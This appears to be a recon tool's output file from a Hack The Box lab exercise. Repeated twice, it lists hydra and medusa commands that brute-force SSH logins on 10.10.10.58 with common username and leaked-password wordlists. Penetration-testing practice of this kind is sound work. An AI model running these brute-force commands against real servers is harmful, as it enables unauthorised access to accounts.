```bash
[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/parallels/HacktheBox/OSCP-like/Linux-Node/results/10.10.10.58/scans/tcp22/tcp_22_ssh_hydra.txt" ssh://10.10.10.58

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/home/parallels/HacktheBox/OSCP-like/Linux-Node/results/10.10.10.58/scans/tcp22/tcp_22_ssh_medusa.txt" -M ssh -h 10.10.10.58

[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/parallels/HacktheBox/OSCP-like/Linux-Node/results/10.10.10.58/scans/tcp22/tcp_22_ssh_hydra.txt" ssh://10.10.10.58

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/home/parallels/HacktheBox/OSCP-like/Linux-Node/results/10.10.10.58/scans/tcp22/tcp_22_ssh_medusa.txt" -M ssh -h 10.10.10.58


```